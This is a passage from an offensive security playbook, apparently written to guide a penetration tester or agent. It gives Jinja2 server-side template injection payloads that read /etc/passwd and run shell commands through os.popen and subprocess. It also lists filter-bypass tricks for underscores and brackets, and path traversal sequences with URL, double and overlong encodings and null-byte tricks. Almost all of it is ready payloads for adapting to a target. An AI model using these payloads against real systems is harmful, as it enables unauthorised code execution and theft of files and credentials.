[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Jinja2/Python Object Traversal                                           [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ''.__class__                  → ''|attr('__class__')                         [34m│[0m
[34m│[0m                               → ''|attr('\x5f\x5fclass\x5f\x5f')             [34m│[0m
[34m│[0m                               → ''|attr(request.args.x) with ?x=__class__    [34m│[0m
[34m│[0m                               → getattr('','__class__')                      [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Blocked Underscores Bypass                                               [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m __class__                     → \x5f\x5fclass\x5f\x5f (hex escape)           [34m│[0m
[34m│[0m                               → request.args.c with ?c=__class__             [34m│[0m
[34m│[0m                               → attr filter with crafted string              [34m│[0m
[34m│[0m                               → |join                                        [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Blocked Brackets Bypass                                                  [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m config['SECRET']              → config|attr('SECRET')                        [34m│[0m
[34m│[0m                               → config.SECRET (dot notation)                 [34m│[0m
[34m│[0m                               → getattr(config,'SECRET')                     [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Alternative Entry Points (not just '')                                   [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m - cycler, joiner, namespace (Jinja2 built-ins)                               [34m│[0m
[34m│[0m - lipsum.__globals__                                                         [34m│[0m
[34m│[0m - range.__init__.__globals__                                                 [34m│[0m
[34m│[0m - request.application.__globals__                                            [34m│[0m
[34m│[0m - config.__class__.__init__.__globals__                                      [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Common Jinja2 SSTI Payloads                                              [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Read file:**                                                               [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}     [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Execute command:**                                                         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m {{ ''.__class__.__mro__[2].__subclasses__()[X]('id', shell=True,             [34m│[0m
[34m│[0m stdout=-1).communicate() }}                                                  [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m Where X is the index of subprocess.Popen in __subclasses__()                 [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Using cycler:**                                                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m {{ cycler.__init__.__globals__.os.popen('id').read() }}                      [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Using lipsum:**                                                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m {{ lipsum.__globals__['os'].popen('id').read() }}                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Using config:**                                                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Template Delimiter Variations                                            [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m Jinja2: {{ }}, {% %}, {# #}                                                  [34m│[0m
[34m│[0m Twig: {{ }}, {% %}                                                           [34m│[0m
[34m│[0m Smarty: { }, {literal}                                                       [34m│[0m
[34m│[0m Freemarker: ${}, <#>                                                         [34m│[0m
[34m│[0m Velocity: $, #                                                               [34m│[0m
[34m│[0m Mako: ${}, <%, %>                                                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Building Blocks Approach                                                 [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m SSTI BUILDING BLOCKS:                                                        [34m│[0m
[34m│[0m 1. Template delimiter: {{ }}, ${ }, <% %>                                    [34m│[0m
[34m│[0m 2. Object access: literals, globals, built-ins                               [34m│[0m
[34m│[0m 3. Traversal: __class__, __mro__, __subclasses__                             [34m│[0m
[34m│[0m 4. Execution: popen(), system(), eval()                                      [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ## Path Traversal Attack Playbook                                            [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m > **IMPORTANT:** All payloads in this playbook are EXAMPLES that must be     [34m│[0m
[34m│[0m MODIFIED for your specific target. Replace placeholders like `{FILE_PATH}`,  [34m│[0m
[34m│[0m `{DEPTH}`, `{TARGET_FILE}` with actual values. Adapt payloads based on:      [34m│[0m
[34m│[0m > - Target operating system (Unix/Linux vs Windows)                          [34m│[0m
[34m│[0m > - Web server and application framework                                     [34m│[0m
[34m│[0m > - Path normalization behavior                                              [34m│[0m
[34m│[0m > - Discovered file locations and depth                                      [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Path Normalization Reasoning                                             [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **THINK ABOUT PATH PROCESSING:**                                             [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m 1. **WHAT NORMALIZES THE PATH?**                                             [34m│[0m
[34m│[0m    - OS filesystem                                                           [34m│[0m
[34m│[0m    - Web server (Apache, nginx)                                              [34m│[0m
[34m│[0m    - Application framework                                                   [34m│[0m
[34m│[0m    - Custom code                                                             [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Traversal Sequence Variations                                            [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ../ (Unix standard)                                                          [34m│[0m
[34m│[0m ..\ (Windows)                                                                [34m│[0m
[34m│[0m ....// (double-dot removal bypass)                                           [34m│[0m
[34m│[0m ..;/ (Tomcat path parameter)                                                 [34m│[0m
[34m│[0m ..\/ (mixed separator)                                                       [34m│[0m
[34m│[0m ..%2f (URL encoded)                                                          [34m│[0m
[34m│[0m ..%5c (URL encoded backslash)                                                [34m│[0m
[34m│[0m %2e%2e%2f (full URL encode)                                                  [34m│[0m
[34m│[0m %252e%252e%252f (double encode)                                              [34m│[0m
[34m│[0m ..%c0%af (UTF-8 overlong)                                                    [34m│[0m
[34m│[0m ....\/....\ (mixed bypass)                                                   [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Wrapper Bypass                                                           [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **If path MUST start with /uploads/:**                                       [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m /uploads/../../../etc/passwd                                                 [34m│[0m
[34m│[0m /uploads/..%2f..%2f..%2fetc/passwd                                           [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **If extension MUST be .jpg:**                                               [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ../../../etc/passwd%00.jpg (null byte - old)                                 [34m│[0m
[34m│[0m ../../../etc/passwd/.jpg (path confusion)                                    [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Null Byte Injection                                                      [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m Pattern               │ Effect                                               [34m│[0m
[34m│[0m ──────────────────────┼────────────────────────────────────────────          [34m│[0m
[34m│[0m file.php%00.jpg       │ C-based filter sees .jpg, PHP sees .php              [34m│[0m
[34m│[0m ../../../etc/passwd%00│ Truncates appended extension                         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Path Alternatives                                                        [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m /etc/passwd                   → /e?c/p?ss??                                  [34m│[0m
[34m│[0m                               → /e*c/p*d                                     [34m│[0m
[34m│[0m                               → ././etc/./passwd                             [34m│[0m
[34m│[0m                               → /etc//passwd                                 [34m│[0m
[34m│[0m                               → /etc/passwd/.                                [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Encoding Ladder for Path Traversal                                       [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ENCODING LADDER (apply progressively):                                       [34m│[0m
[34m│[0m ───────────────────────────────────────────────────────────────────          [34m│[0m
[34m│[0m Raw          │ ../etc/passwd                                                 [34m│[0m
[34m│[0m URL          │ ..%2Fetc%2Fpasswd                                             [34m│[0m
[34m│[0m Double-URL   │ ..%252F...                                                    [34m│[0m
[34m│[0m Unicode      │ \u002e\u002e/                                                 [34m│[0m
[34m│[0m UTF-8 Overlong│ %c0%ae (for .)                                               [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **KEY INSIGHT:** Filters decode at one layer, execution happens at another.  [34m│[0m
[34m│[0m - If filter checks URL-decoded but backend double-decodes → double-encode    [34m│[0m
[34m│[0m - If filter checks raw but backend URL-decodes → URL-encode                  [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Recursive Filter Testing                                                 [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m IF FILTER REMOVES DANGEROUS STRINGS:                                         [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m Input:  ../                                                                  [34m│[0m
[34m│[0m Output: (empty) - ".." removed                                               [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m Try:    ....//                                                               [34m│[0m
[34m│[0m After:  ../ - nested payload survives!                                       [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m TRY THESE PATTERNS:                                                          [34m│[0m
[34m│[0m ....//              → becomes ../                                            [34m│[0m
[34m│[0m ..../..../          → multi-layer                                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
